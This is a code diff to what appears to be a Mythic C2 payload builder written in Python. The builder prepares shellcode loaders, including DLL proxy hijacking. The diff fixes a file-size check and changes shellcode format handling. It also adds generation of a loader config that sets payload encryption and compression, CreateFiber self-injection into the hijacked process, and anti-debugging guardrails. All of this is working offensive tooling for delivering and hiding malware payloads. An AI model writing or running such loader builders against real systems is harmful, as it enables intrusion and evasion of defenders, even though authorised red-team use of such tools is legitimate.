@@ -732,7 +732,6 @@ If one is not uploaded then an example file will be used.""",
             name = "1.0 DLL Hijacking",
             parameter_type = BuildParameterType.File,
             description = f"""Prepares a given DLL for proxy-based hijacking.
-NOTE: Shellcode Format must be set to C.
 NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
 """,
             hide_conditions = [
@@ -1541,7 +1540,7 @@ generated if none have been entered.""",
             with open(mythic_shellcode_path, "wb") as file:
                 file.write(self.wrapped_payload)
 
-            if os.stat(mythic_shellcode_path) == 0:
+            if os.stat(mythic_shellcode_path).st_size == 0:
                 response.status = BuildStatus.Error
                 response.build_stderr = "Failed to write Mythic Shellcode to placeholder file."
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -1604,9 +1603,6 @@ generated if none have been entered.""",
                 "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                 # "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
             ]
-
-            if self.get_parameter("0.0 Main Payload Type") == "Hijack":
-                cmd += ["-f", "csharp"]
 
             match self.get_parameter("0.1 Loader Type"):
                 case "ClickOnce":
@@ -2050,6 +2046,49 @@ generated if none have been entered.""",
                 guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
                 with open(str(guardrail_hpp_path), "w") as file:
                     file.write(guardrail_output)
+
+                # Render config.hpp for Hijack build so encryption/compression settings take effect
+                try:
+                    config_template = environment.get_template("config.hpp")
+                    compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
+                    encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
+                    config_data = {
+                        "TARGET_PROCESS": "",
+                        "INJECTION_TYPE": 3,  # CreateFiber (self-injection) — DLL runs in the hijacked process
+                        "COMPRESSION_TYPE": compression_type_value,
+                        "ENCODING_TYPE": encoding_type_value,
+                        "ENCRYPTION_TYPE": encryption_type_value,
+                        "ENCRYPTION_KEY": encryption_key_bytes,
+                        "ENCRYPTION_IV": encryption_iv_bytes,
+                        "GUARDRAILS_ENABLED": 1 if guardrails_enabled else 0,
+                        "GUARDRAILS_CHECK_DEBUGGER": 1 if self.get_parameter("1.1a Check IsDebuggerPresent") and guardrails_enabled else 0,
+                        "GUARDRAILS_CHECK_REMOTE_DEBUGGER": 1 if self.get_parameter("1.1b Check Remote Debugger") and guardrails_enabled else 0,
+                        "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": 1 if self.get_parameter("1.1c Check Debugger Processes") and guardrails_enabled else 0,
+                        "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": 1 if self.get_parameter("1.1d Check Hardware Breakpoints") and guardrails_enabled else 0,
+                        "GUARDRAILS_CHECK_TIMING": 1 if self.get_parameter("1.1e Check Timing Anomalies") and guardrails_enabled else 0,
+                    }
+                    rendered_config = config_template.render(**config_data)
+                    config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
+                    with open(config_hpp_destination, "w") as config_file:
+                        config_file.write(rendered_config)
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="[T1036] - Configuring DLL Hijack Loader",
+                        StepStdout="Generated config.hpp with encryption/compression settings",
+                        StepSuccess=True,
+                    ))
+                except Exception as e:
+                    response.status = BuildStatus.Error
+                    response.build_stderr = f"Failed to render Hijack config: {str(e)}"
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="[T1036] - Configuring DLL Hijack Loader",
+                        StepStdout=f"Failed to render config.hpp: {str(e)}",
+                        StepSuccess=False,
+                    ))
+                    return response
 
                 # DLL Hijack compilation
                 cmd = [
